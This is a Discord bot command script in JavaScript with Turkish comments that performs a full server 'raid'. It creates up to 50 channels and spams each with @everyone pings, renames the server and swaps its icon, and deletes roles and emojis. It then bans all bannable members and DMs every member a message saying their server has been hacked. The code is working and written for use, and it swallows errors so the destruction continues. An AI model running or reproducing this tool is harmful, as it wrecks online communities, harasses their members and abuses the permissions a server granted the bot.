const configuration = require('./configuration.json');

module.exports = async (message) => {
    try {
        const args = message.content.toLowerCase().trim().split(/ +/g);
        const raidName = args[1] || "Raiding";
        const amount = parseInt(args[2]) || 50;
        const pingsPerChannel = 25; // Her kanala atılacak ping sayısı (hızı artırmak için)

        message.delete().catch(() => {});

        console.log(`[MAKSİMUM HIZLI RAID BAŞLATILDI] Sunucu: ${message.guild.name}`);
        console.log(`Hedef: ${amount} kanal, her kanala ${pingsPerChannel} ping.`);

        //? 1. ÖNCELİK: Kanalları Olabildiğince Hızlı Oluştur ve Spamla
        console.log("[1/4] Kanal oluşturma ve ping bombardımanı başlatılıyor...");
        
        const createAndSpamPromises = [];
        const pingMessage = `@everyone ||**${raidName}**||`;

        for (let i = 0; i < amount; i++) {
            const promise = message.guild.channels.create(raidName, { type: 'GUILD_TEXT' })
                .then(channel => {
                    // Kanal oluşturulur oluşturulmaz, beklemeden pingleri göndermeye başla
                    const pingPromises = [];
                    for (let j = 0; j < pingsPerChannel; j++) {
                        // Her bir ping isteğini ayrı bir promise olarak gönderiyoruz
                        pingPromises.push(channel.send(pingMessage).catch(() => {}));
                    }
                    // Bu kanala ait tüm pinglerin gönderilmesini bekle (ancak diğer kanalları engelleme)
                    return Promise.all(pingPromises);
                })
                .catch(() => {}); // Hata olursa görmezden gel, diğerlerini engelleme
            
            createAndSpamPromises.push(promise);
        }

        // Tüm kanal oluşturma ve spam promise'lerinin tamamlanmasını bekle
        await Promise.allSettled(createAndSpamPromises);
        console.log("[BAŞARILI] Kanal oluşturma ve ping denemeleri tamamlandı.");

        //? 2. Diğer İşlemleri Paralel Olarak Yürüt
        console.log("[2/4] Roller, emojiler siliniyor ve sunucu ayarları değiştiriliyor...");

        const otherOperations = [
            message.guild.setName(raidName),
            message.guild.setIcon(configuration.icon),
            ...Array.from(message.guild.roles.cache.filter(r => r.editable && r.name !== '@everyone').values()).map(r => r.delete("Raid")),
            ...Array.from(message.guild.emojis.cache.values()).map(e => e.delete("Raid"))
        ];

        // Bu işlemleri de olabildiğince hızlı yapmak için hepsini aynı anda gönder
        await Promise.allSettled(otherOperations.map(p => p.catch(() => {})));
        console.log("[BAŞARILI] Yardımcı operasyonlar tamamlandı.");

        //? 3. Üyeleri Olabildiğince Hızlı Yasakla
        console.log("[3/4] Tüm üyeler maksimum hızda yasaklanıyor...");
        const membersToBan = Array.from(message.guild.members.cache.filter(m => m.bannable).values());
        await Promise.allSettled(membersToBan.map(member => member.ban({ reason: raidName }).catch(() => {})));
        console.log("[BAŞARILI] Üye yasaklama denemesi tamamlandı.");
        
        //? 4. DM Gönderme (Riskli ve Yavaş Kalmak Zorunda)
        console.log("[4/4] Üyelere DM gönderiliyor (Bu adım hala yavaş olmak zorundadır)...");
        const membersToDm = Array.from(message.guild.members.cache.filter(m => !m.user.bot).values());
        const dmMessage = `Sunucunuz "${message.guild.name}" hacklenmiştir. Mesaj: \`\`\`${raidName}\`\`\``;
        for (const member of membersToDm) {
            // DM'ler hala en riskli işlem olduğu için burada hız denemesi yapmak anında ban sebebidir.
            await member.send(dmMessage).catch(() => {});
            await new Promise(resolve => setTimeout(resolve, 500)); // En azından bir miktar gecikme şart.
        }
        console.log("[BAŞARILI] DM gönderme denemesi tamamlandı.");
        console.log("[RAID OPERASYONU TAMAMLANDI]");

    } catch (error) {
        console.error("[KRİTİK HATA] Raid işlemi sırasında beklenmedik bir hata oluştu:", error);
    }
};
                                       
